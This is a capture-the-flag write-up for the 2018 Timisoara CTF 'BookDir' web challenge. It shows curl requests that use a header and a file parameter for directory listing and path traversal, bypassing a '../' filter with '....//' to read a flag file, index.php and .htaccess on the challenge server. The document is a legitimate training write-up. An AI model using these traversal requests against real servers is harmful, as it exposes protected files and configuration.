# CTF - 2018 - Timisoara CTF 2018 Quals / Web / BookDir

## Part 1 - 125 pts
- We get a list of book :
```
curl -H 'X-Dir: .' "http://89.38.210.129:8012/books/booklist.php"                                                                                                                                             
[{"name":"Beloved"},{"name":"Catch-22"},{"name":"Lolita"},{"name":"Nineteen Eighty-Four"},{"name":"The Catcher in the Rye"},{"name":"The Grapes of Wrath"},{"name":"The Great Gatsby"},{"name":"The Sound and the F
ury"},{"name":"Ulysses"}]
```

- We can go backward with ../
```
curl -H 'X-Dir: ../' "http://89.38.210.129:8012/books/booklist.php"                                                                                                                                           
[{"name":"4o4_fl4g_n0t_f0und.php"},{"name":"booklist.php"},{"name":"books.js"},{"name":"css"},{"name":"index.html"},{"name":"list"},{"name":"vendor"}]
```

- We find the `4o4_fl4g_n0t_f0und.php` and we will try to read it

- Using param f we can read file :
```
curl "http://89.38.210.129:8012/books/booklist.php?f=Beloved"                                                                                                                                 
"\"124 was spiteful. Full of baby's venom. The women in the house knew it and so did the children.\"\n"
```

- After some test, we found that  `../` is filtered and we need to double it to bypass `....//`:
```
curl "http://89.38.210.129:8012/books/booklist.php?f=....//4o4_fl4g_n0t_f0und.php"                                                                                                            
"<?php\n\/\/ timctf{f0und_f1rst_p4rt___wh4t_n3xt}\n\n\/\/ Can you get the second part? :^)\n"
```

- Demo here : [![asciicast](https://asciinema.org/a/cWNRvHjmR5wmIhsptmQBx2hJz.png)](https://asciinema.org/a/cWNRvHjmR5wmIhsptmQBx2hJz?speed=2)

## Part 2 - 75 pts
- We will try to read index.php :
```
curl "http://89.38.210.129:8012/books/booklist.php?f=....//....//index.php"                                                                                                                                   
"<?php\n\n\/\/ TRY HARDER\nheader('Location: books\/');\n"
```

- So let's try to get .htaccess :
```
curl "http://89.38.210.129:8012/books/booklist.php?f=....//....//.htaccess"                                                                                                                                   
"<Files .htaccess>\n  Order allow,deny\n  Deny from all\n<\/Files>\n\n<Files w0w_y0u_g0t_m3___.php>\n  Order allow,deny\n  Deny from all\n<\/Files>\n\nRewriteEngine On\nRewriteRule ^(?:books\/list)\\b.* \/403.ph
p\n"
```

- find `w0w_y0u_g0t_m3___.php`, let's read it :
```
curl "http://89.38.210.129:8012/books/booklist.php?f=....//....//w0w_y0u_g0t_m3___.php"                                                                                                                       
"<?php\n\n\/\/ timctf{b0Ok5_4r3_4m4z1ng}\necho 'c0ngr4ts!';\n"
```

- Flag \o/

- Demo here : [![asciicast](https://asciinema.org/a/8Sw5A1kr088QRstaQ7VSLuHGZ.png)](https://asciinema.org/a/8Sw5A1kr088QRstaQ7VSLuHGZ?speed=2)  
